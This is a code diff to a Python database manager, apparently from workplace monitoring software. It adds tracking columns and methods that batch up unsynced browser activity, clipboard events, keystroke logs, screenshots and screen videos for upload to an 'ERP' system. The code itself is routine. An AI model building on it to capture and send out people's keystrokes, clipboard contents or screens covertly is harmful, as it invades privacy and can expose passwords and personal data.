@@ -163,6 +163,18 @@ class DatabaseManager:
                     )
                     logger.info("Migration: added username column to %s", table)
 
+            # ── synced column: browser_activity + text_logs ──────────────────
+            # These two tables were created without a synced column.
+            # SyncService v2 needs it to track which rows have been sent to ERP.
+            for _tbl in ("browser_activity", "text_logs"):
+                cursor.execute(f"PRAGMA table_info({_tbl})")
+                _cols = [r[1] for r in cursor.fetchall()]
+                if "synced" not in _cols:
+                    cursor.execute(
+                        f"ALTER TABLE {_tbl} ADD COLUMN synced INTEGER DEFAULT 0"
+                    )
+                    logger.info("Migration: added synced column to %s", _tbl)
+
             conn.commit()
         except Exception as e:
             logger.error(f"Migration failed: {e}")
@@ -648,6 +660,105 @@ class DatabaseManager:
             conn.commit()
         except Exception as e:
             logger.error(f"Failed to mark data as synced: {e}")
+            conn.rollback()
+        finally:
+            conn.close()
+
+    def get_unsynced_browser(self, limit: int = 50) -> list:
+        """Return browser_activity rows pending ERP sync."""
+        conn = self._get_connection()
+        cursor = conn.cursor()
+        try:
+            cursor.execute(
+                "SELECT * FROM browser_activity WHERE synced = 0 ORDER BY timestamp ASC LIMIT ?",
+                (limit,)
+            )
+            return [dict(r) for r in cursor.fetchall()]
+        except Exception as e:
+            logger.error("get_unsynced_browser: %s", e)
+            return []
+        finally:
+            conn.close()
+
+    def get_unsynced_clipboard(self, limit: int = 50) -> list:
+        """Return clipboard_events rows pending ERP sync."""
+        conn = self._get_connection()
+        cursor = conn.cursor()
+        try:
+            cursor.execute(
+                "SELECT * FROM clipboard_events WHERE synced = 0 ORDER BY timestamp ASC LIMIT ?",
+                (limit,)
+            )
+            return [dict(r) for r in cursor.fetchall()]
+        except Exception as e:
+            logger.error("get_unsynced_clipboard: %s", e)
+            return []
+        finally:
+            conn.close()
+
+    def get_unsynced_keystrokes(self, limit: int = 50) -> list:
+        """Return text_logs rows pending ERP sync."""
+        conn = self._get_connection()
+        cursor = conn.cursor()
+        try:
+            cursor.execute(
+                "SELECT * FROM text_logs WHERE synced = 0 ORDER BY timestamp ASC LIMIT ?",
+                (limit,)
+            )
+            return [dict(r) for r in cursor.fetchall()]
+        except Exception as e:
+            logger.error("get_unsynced_keystrokes: %s", e)
+            return []
+        finally:
+            conn.close()
+
+    def get_unsynced_screenshots(self, limit: int = 20) -> list:
+        """Return screenshots rows pending ERP sync (smaller batch — these are files)."""
+        conn = self._get_connection()
+        cursor = conn.cursor()
+        try:
+            cursor.execute(
+                "SELECT * FROM screenshots WHERE synced = 0 ORDER BY timestamp ASC LIMIT ?",
+                (limit,)
+            )
+            return [dict(r) for r in cursor.fetchall()]
+        except Exception as e:
+            logger.error("get_unsynced_screenshots: %s", e)
+            return []
+        finally:
+            conn.close()
+
+    def get_unsynced_videos(self, limit: int = 5) -> list:
+        """Return video_recordings rows pending ERP sync (tiny batch — large files)."""
+        conn = self._get_connection()
+        cursor = conn.cursor()
+        try:
+            cursor.execute(
+                "SELECT * FROM video_recordings WHERE is_synced = 0 ORDER BY timestamp ASC LIMIT ?",
+                (limit,)
+            )
+            return [dict(r) for r in cursor.fetchall()]
+        except Exception as e:
+            logger.error("get_unsynced_videos: %s", e)
+            return []
+        finally:
+            conn.close()
+
+    def mark_videos_synced(self, ids: list):
+        """video_recordings uses is_synced (not synced) — needs its own method."""
+        if not ids:
+            return
+        conn = self._get_connection()
+        cursor = conn.cursor()
+        try:
+            placeholders = ','.join(['?'] * len(ids))
+            cursor.execute(
+                f"UPDATE video_recordings SET is_synced = 1 WHERE id IN ({placeholders})",
+                ids
+            )
+            conn.commit()
+        except Exception as e:
+            logger.error("mark_videos_synced: %s", e)
             conn.rollback()
         finally:
             conn.close()
